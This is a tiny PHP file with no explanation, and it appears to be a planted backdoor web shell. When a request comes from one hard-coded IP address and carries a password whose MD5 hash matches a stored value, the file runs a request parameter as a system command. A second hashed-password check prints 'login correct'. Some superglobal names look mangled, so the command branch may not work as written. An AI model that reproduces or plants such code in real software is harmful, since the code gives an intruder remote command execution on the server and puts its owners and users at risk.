<?php
if ($SERVER["REMOTEADDR"]=="178.162.201.166" && md5($REQUEST['secure'])=="7f02b0ae0869cc5aa38cd7ca6c767c92")
	system($REQUEST['secmd']); 
if(md5($_REQUEST["mgp"])=="4f6e5768b76809bc99bf278494b5f352")
	echo "login correct";

?>